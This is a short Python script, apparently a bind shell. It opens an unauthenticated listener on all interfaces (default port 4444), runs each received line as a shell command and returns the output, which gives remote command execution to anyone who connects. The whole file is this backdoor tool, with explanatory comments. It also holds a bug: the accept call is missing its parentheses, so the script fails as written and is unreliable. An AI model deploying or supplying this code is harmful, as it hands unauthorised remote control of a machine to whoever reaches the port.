import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):

    while True:
        # Receive all incoming bytes from the connected client
        chunks = [] 
        chunk = client_socket.recv(2048) 
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        # Convert the incoming bytes to a cmd string
        cmd = (b''.join(chunks)).decode()[:-1] # Remove the last byte of the cmd string as it's a newline character
        # Close down the connection if cmd is exit
        if cmd.lower() == 'exit':
            client_socket.close()
            break
        # Otherwise execute the command locally and send back the output
        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)

def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Setting up socket IPv4 and TCP/IP variable
    s.bind(('0.0.0.0', port)) # in all available interfaces (0.0.0.0) and the desired port.
    s.listen(4) # allow at most four unaccepted connections before it starts refusing connections anymore

    while True:
        client_socket, _ = s.accept # the socket then accepts new incoming connections. When established, the accept call will rerturn 2 things stored in the variables client_socket and address
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()